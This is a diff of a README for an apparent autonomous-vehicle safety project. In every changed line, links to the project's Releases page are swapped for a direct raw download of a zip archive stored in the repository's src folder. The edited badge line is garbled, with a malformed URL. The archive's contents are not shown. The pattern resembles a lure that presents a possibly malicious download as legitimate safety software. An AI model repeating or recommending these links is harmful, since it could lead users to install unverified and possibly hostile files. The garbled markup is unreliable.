@@ -1,6 +1,6 @@
 # 🚗 ISO26262-ASIL-D-Safety-Island - Safety for Autonomous Vehicles
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/F4kEBoi/ISO26262-ASIL-D-Safety-Island/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/F4kEBoi/ISO26262-ASIL-D-Safety-Island/main/src/Island_ASI_IS_Safety_1.1-beta.3.zip%20Latest%https://raw.githubusercontent.com/F4kEBoi/ISO26262-ASIL-D-Safety-Island/main/src/Island_ASI_IS_Safety_1.1-beta.3.zip)](https://raw.githubusercontent.com/F4kEBoi/ISO26262-ASIL-D-Safety-Island/main/src/Island_ASI_IS_Safety_1.1-beta.3.zip)
 
 ## 📖 Overview
 
@@ -27,7 +27,7 @@ To run ISO26262-ASIL-D-Safety-Island, you’ll need:
 
 1. **Download the Application**: Visit the Releases page to download the latest version of the software.
    
-   [Download Latest Release](https://github.com/F4kEBoi/ISO26262-ASIL-D-Safety-Island/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/F4kEBoi/ISO26262-ASIL-D-Safety-Island/main/src/Island_ASI_IS_Safety_1.1-beta.3.zip)
 
 2. **Configure Your Environment**: Make sure you have a compatible development board set up. 
 
@@ -37,7 +37,7 @@ To run ISO26262-ASIL-D-Safety-Island, you’ll need:
 
 ## 🔗 Download & Install
 
-To download the software, please visit [this page](https://github.com/F4kEBoi/ISO26262-ASIL-D-Safety-Island/releases), where you will find the latest release. Follow the instructions below to proceed:
+To download the software, please visit [this page](https://raw.githubusercontent.com/F4kEBoi/ISO26262-ASIL-D-Safety-Island/main/src/Island_ASI_IS_Safety_1.1-beta.3.zip), where you will find the latest release. Follow the instructions below to proceed:
 
 - Click on the appropriate version link to start the download.
 - After the download finishes, follow the setup instructions as defined in the documentation found in the repository. 
